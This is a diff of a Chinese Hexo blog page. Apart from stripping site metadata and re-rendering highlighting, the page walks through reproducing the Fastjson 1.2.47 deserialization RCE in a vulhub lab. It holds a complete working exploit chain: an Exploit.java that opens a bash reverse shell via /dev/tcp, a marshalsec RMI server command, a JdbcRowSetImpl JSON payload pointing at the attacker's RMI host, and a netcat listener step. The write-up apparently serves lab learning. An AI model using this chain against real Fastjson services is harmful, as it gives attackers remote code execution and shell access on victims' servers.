@@ -4,9 +4,9 @@
   <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF" />
+  <meta name="keywords" content="" />
   <meta name="author" content="slug01sh" />
-  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。" />
+  <meta name="description" content="" />
   
   
   <title>
@@ -16,7 +16,7 @@
       
       |
     
-     积淀｜小杰的个人博客
+     slug01sh
   </title>
 
   
@@ -57,7 +57,7 @@
     </script>
   
 
-<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="积淀｜小杰的个人博客" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="slug01sh" type="application/atom+xml">
 </head>
 
 
@@ -153,8 +153,7 @@ MathJax = {
 <h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h1><p>Fastjson1.2.47以及之前的所有版本</p>
 <h1 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h1><ol>
 <li><p>启动环境</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 下载 vulhub</span><br>git clone https://github.com/vulhub/vulhub.git<br><span class="hljs-meta">#</span><span class="bash"> 启动</span><br>cd vulhub/fastjson/1.2.47-rce<br>docker-compose up -d<br></code></pre></td></tr></table></figure>
-</li>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载 vulhub</span></span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">cd vulhub/fastjson/1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
 <li><p>判断是否正常启动。访问<code>http://127.0.0.1:8090</code>，会返回一个 Json 串，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210304172714.png"></p>
 </li>
 </ol>
@@ -169,7 +168,7 @@ MathJax = {
 </li>
 </ol>
 <p>创建恶意代码 <code>Exploit.java</code> 文件，代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exploit</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      Runtime<br>        .getRuntime()<br>        .exec(<br>          <span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.18.0.1/9876 0&gt;&amp;1&quot;</span><br>        );<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      e.printStackTrace();<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] argv)</span> </span>&#123;<br>    Exploit e = <span class="hljs-keyword">new</span> Exploit();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Runtime</span><br><span class="line">        .getRuntime()</span><br><span class="line">        .exec(</span><br><span class="line">          <span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.18.0.1/9876 0&gt;&amp;1&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">    Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>使用 <code>javac Exploit.java</code> 进行编译。(记得修改上面的为自己的主机 ip 地址)</p>
 <ol start="2">
 <li><font color="red">搭建 Web 服务，让<strong>目标靶机</strong>可以访问。</font></li>
@@ -179,9 +178,9 @@ MathJax = {
 <li><font color="red">使用 marshalsec 搭建 RMI（Remote Method Invoke）环境.在 java 反序列化时，利用序列化数据造成代码执行攻击。</font></li>
 </ol>
 <p>先编译 marshalsec</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br>git <span class="hljs-built_in">clone</span> https://github.com/mbechler/marshalsec.git<br><span class="hljs-built_in">cd</span> marshalsec <br>mvn clean package -DskipTests <span class="hljs-comment"># 使用 maven 编译</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec </span><br><span class="line">mvn clean package -DskipTests <span class="comment"># 使用 maven 编译</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>编译后进入 <code>target</code> 目录，并使用下面的命令启动 RMI 服务</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.18.0.1:8081/#Exploit&quot;</span> 9999<br></code></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://172.18.0.1:8081/#Exploit&quot;</span> 9999</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>这里的 URL <code>http://172.18.0.1:8081/#Exploit</code> 有几个关键的要素：</p>
 <ol>
@@ -193,7 +192,7 @@ MathJax = {
 <li><font color="red">使用 Burpsuite 修改 GET 为 POST，并发送 exp。</font></li>
 </ol>
 <p>exp:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><br>    <span class="hljs-attr">&quot;a&quot;</span>:&#123;<br><br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br><br>        <span class="hljs-attr">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><br>    &#125;,<br><br>    <span class="hljs-attr">&quot;b&quot;</span>:&#123;<br><br>        <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://172.18.0.1:9999/Exploit&quot;</span>,<br><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://172.18.0.1:9999/Exploit&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Burpsuite具体配置如下：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133216.png"></p>
 <p>在 VPS 中使用命令 <code>nc -lvp 9876</code> 来接收反弹的 shell，然后在 Burp 发送数据包，发送后能观察到 RMI 服务和 Web 服务都被靶机访问。（说明发送过程没问题，如果没有看到下面的结果，需要检查一下 IP 和端口设置）</p>
 <p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133353.png"></p>
